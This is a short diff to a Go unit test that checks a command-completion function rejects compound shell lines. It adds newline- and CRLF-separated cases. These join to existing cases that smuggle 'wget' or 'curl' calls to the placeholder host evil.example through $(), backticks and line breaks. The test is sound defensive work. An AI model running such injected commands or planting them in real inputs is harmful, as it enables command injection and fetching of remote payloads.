@@ -90,6 +90,8 @@ func TestShouldAttemptCompletionRejectsCompoundLines(t *testing.T) {
 		"echo $(wget http://evil.example/x)",
 		"uptime & ",
 		"nproc `curl http://evil.example/x`",
+		"uptime\nwget http://evil.example/x",
+		"uptime\r\nwget http://evil.example/x",
 	} {
 		if _, ok := ShouldAttemptCompletion(line); ok {
 			t.Errorf("ShouldAttemptCompletion(%q) = true, want false -- compound line", line)
